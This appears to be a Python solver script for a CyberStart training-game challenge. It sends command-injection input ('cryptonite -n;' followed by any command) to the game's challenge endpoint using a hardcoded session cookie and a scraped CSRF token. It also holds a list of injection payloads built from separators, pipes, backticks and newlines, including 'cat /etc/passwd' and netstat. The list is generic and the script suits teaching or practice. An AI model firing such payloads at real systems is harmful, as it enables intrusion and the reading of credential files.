#!/usr/bin/env python3
import requests
import sys

session = requests.Session()


response = session.get(
    "https://game.joincyberstart.com/base-headquarters",
    cookies={"Cyber_Protection_Agency": "etkvb9vaaga0sh02mb010p9clp"},
)

import re


def run(command):
    print(command)
    challenge_url = f"https://game.joincyberstart.com/challenge?base=1&level=11&challenge=8&csrf={csrf_base}"

    response3 = session.post(
        challenge_url,
        cookies={"Cyber_Protection_Agency": "etkvb9vaaga0sh02mb010p9clp"},
        data={"command": command},
    )

    res_parsed = re.search(r'"line">(.*?)<\/div>', response3.text)
    print(res_parsed.group(1))


matches = re.search(r'csrf=(.*?)"', response.text)
csrf_base = matches.group(1)

# print(csrf_base)
if len(sys.argv) == 1:
    command = input("cmd > ")
else:
    command = " ".join(sys.argv[1:])


commands = """
/index.html|ls|
;ls;
;ls
;netstat -a;
;system('cat%20/etc/passwd')
;ls;
|ls
|/usr/bin/ls
|ls|
|/usr/bin/ls|
||/usr/bin/ls|
|ls;
||/usr/bin/ls;
;ls|
;|/usr/bin/ls|
\n/bin/ls -al\n
\n/usr/bin/ls\n
\nls\n
\n/usr/bin/ls;
\nls;
\n/usr/bin/ls|
\nls|
;/usr/bin/ls\n
;ls\n
|usr/bin/ls\n
|nls\n
`ls`
`/usr/bin/ls`
a);ls
a;ls
a);ls;
a;ls;
a);ls|
a;ls|
a)|ls
a|ls
a)|ls;
a|ls
|/bin/ls -al
a);/usr/bin/ls
a;/usr/bin/ls
a);/usr/bin/ls;
a;/usr/bin/ls;
a);/usr/bin/ls|
a;/usr/bin/ls|
a)|/usr/bin/ls
a|/usr/bin/ls
a)|/usr/bin/ls;
a|/usr/bin/ls
"""

# commands = commands.strip().split("\n")
# commands2 = []
# for i in range(len(commands)):
#     commands2.append("cryptonite -n" + commands[i])
#     commands2.append("cryptonite -n " + commands[i])
#     commands[i] = "cryptonite -n " + commands[i].strip()
# commands.extend(commands2)
# for payload in commands:
#     run(payload)

run("cryptonite -n;" + command)
# print(response3.text)